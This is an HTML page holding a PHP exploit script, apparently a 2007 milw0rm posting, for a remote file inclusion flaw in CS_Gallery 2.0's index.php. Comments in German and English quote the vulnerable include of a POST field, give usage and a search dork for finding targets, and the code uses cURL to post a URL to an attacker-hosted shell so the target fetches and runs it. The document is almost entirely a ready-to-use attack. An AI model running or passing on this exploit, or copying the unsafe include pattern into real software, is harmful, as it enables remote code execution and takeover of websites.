<html><head><title>CS-Gallery 2.0 (index.php album) Remote File Include Exploit</title></head><pre>&lt;?php

//File Inclusion Exploit for CS_Gallery &lt;= 2.0
//Found and Exploit Coded by burncycle - burncycle[(at)]hotmail[(dot)]de
//|
//Vendor: http://www.cschneider.de/
//Dork: . www.cschneider.info
//|
//Bug in &quot;index.php&quot;:
//..
//$codefile=$_POST['album'].'/code.php';
//include $codefile;
//..
//|
//Usage: php exploit.php [pathtoscript] [pathtoshell]
//Example: php exploit.php http://pathtoscript.com/cs_gallery/(index.php?todo=securealbum) http://pathtoshell.com/(code.php)
//|
//Needs the cURL extension of PHP
//Works regardless of PHP settings

//Nur ausnahme Fehler anzeigen
error_reporting(1);

echo &quot;Usage: php &quot;.$_SERVER[&quot;argv&quot;][0].&quot; [pathtoscript] [pathtoshell]\r\n\r\n&quot;;
echo &quot;Example: php &quot;.$_SERVER[&quot;argv&quot;][0].&quot; http://pathtoscript.com/cs_gallery/(index.php?todo=securealbum) http://pathtoshell.com/(code.php)\r\n\r\n&quot;;

//Schauen ob alles angegeben wurde
if(!empty($_SERVER[&quot;argv&quot;][1]) &amp;&amp; !empty($_SERVER[&quot;argv&quot;][2]))
{

$pathtoscript = $_SERVER[&quot;argv&quot;][1];
$pathtoshell = $_SERVER[&quot;argv&quot;][2];

//erzeuge ein neues cURL Handle
$ch = curl_init();

//setzte die URL und andere Optionen
curl_setopt($ch, CURLOPT_URL, $pathtoscript.&quot;index.php?todo=securealbum&quot;);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, &quot;album=&quot;.$pathtoshell);

//f.hre die Aktion aus
curl_exec($ch);

//schlie.e das Handle und gebe Systemresourcen frei
curl_close($ch);

}

?&gt;

# milw0rm.com [2007-02-24]</pre></html>